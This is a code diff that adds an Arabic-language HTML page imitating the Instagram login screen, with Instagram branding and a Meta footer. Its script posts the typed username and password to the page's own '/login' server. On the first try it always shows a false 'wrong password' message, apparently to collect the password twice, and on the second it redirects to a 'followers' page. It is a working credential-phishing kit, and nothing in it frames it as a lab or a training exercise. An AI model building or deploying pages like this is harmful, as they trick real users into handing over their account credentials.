@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .language-selector {
+            margin-top: 20px;
+            color: #aaa;
+            cursor: pointer;
+        }
+        .container {
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
+            text-align: center;
+            margin-top: 40px;
+        }
+        .logo {
+            font-family: 'Brush Script MT', cursive;
+            font-size: 40px;
+            margin: 40px 0;
+            color: white;
+        }
+        .facebook-login {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px;
+            margin: 20px 0;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-decoration: none;
+        }
+        .facebook-icon {
+            margin-left: 8px;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .divider:before, .divider:after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #333;
+        }
+        .divider-text {
+            margin: 0 10px;
+            color: #aaa;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 5px 0;
+            background-color: #121212;
+            border: 1px solid #333;
+            border-radius: 3px;
+            box-sizing: border-box;
+            color: white;
+        }
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px;
+            margin: 15px 0;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .forgot-password {
+            color: #0095f6;
+            font-size: 12px;
+            text-decoration: none;
+            margin: 20px 0;
+            display: block;
+        }
+        .signup-container {
+            margin-top: 40px;
+        }
+        .signup {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .meta-logo {
+            margin-top: auto;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #aaa;
+        }
+        .meta-text {
+            font-family: Arial, sans-serif;
+            font-size: 24px;
+            font-weight: bold;
+            color: white;
+            margin-top: 5px;
+        }
+        .error-message {
+            color: #ed4956;
+            font-size: 14px;
+            margin: 10px 0;
+            text-align: right;
+        }
+    </style>
+</head>
+<body>
+    <div class="language-selector">
+        <span>▾ العربية</span>
+    </div>
+    
+    <div class="container">
+        <div class="instagram-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 24 24" fill="white">
+                <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+            </svg>
+        </div>
+        <h1 class="logo">Instagram</h1>
+        
+        <form id="loginForm">
+            <input type="text" id="username" name="username" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" required>
+            <input type="password" id="password" name="password" placeholder="كلمة السر" required>
+            
+            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+            
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+        </form>
+        
+        <div class="signup-container">
+            <span>ألا تملك حساب؟ </span>
+            <a href="#" class="signup">تسجيل</a>
+        </div>
+    </div>
+    
+    <div class="meta-logo">
+        <div>from</div>
+        <div class="meta-text">Meta</div>
+    </div>
+
+    <script>
+        // متغير لتتبع عدد محاولات تسجيل الدخول
+        let loginAttempts = 0;
+        
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // زيادة عدد المحاولات
+            loginAttempts++;
+            
+            // إرسال البيانات إلى الخادم
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: password,
+                    attempt: loginAttempts
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('نجاح:', data);
+                
+                if (loginAttempts === 1) {
+                    // في المحاولة الأولى، إظهار رسالة خطأ
+                    const errorElement = document.createElement('div');
+                    errorElement.className = 'error-message';
+                    errorElement.textContent = 'عذراً، كلمة المرور غير صحيحة. يرجى التحقق وإعادة المحاولة.';
+                    
+                    // إزالة أي رسائل خطأ سابقة
+                    const oldError = document.querySelector('.error-message');
+                    if (oldError) oldError.remove();
+                    
+                    // إضافة رسالة الخطأ بعد حقل كلمة المرور
+                    document.getElementById('password').after(errorElement);
+                } else {
+                    // في المحاولة الثانية، توجيه المستخدم إلى صفحة المتابعين
+                    window.location.href = '/followers.html';
+                }
+            })
+            .catch((error) => {
+                console.error('خطأ:', error);
+                alert('حدث خطأ أثناء تسجيل الدخول');
+            });
+        });
+    </script>
+</body>
+</html>
+
+
+
+
+
+
+
+
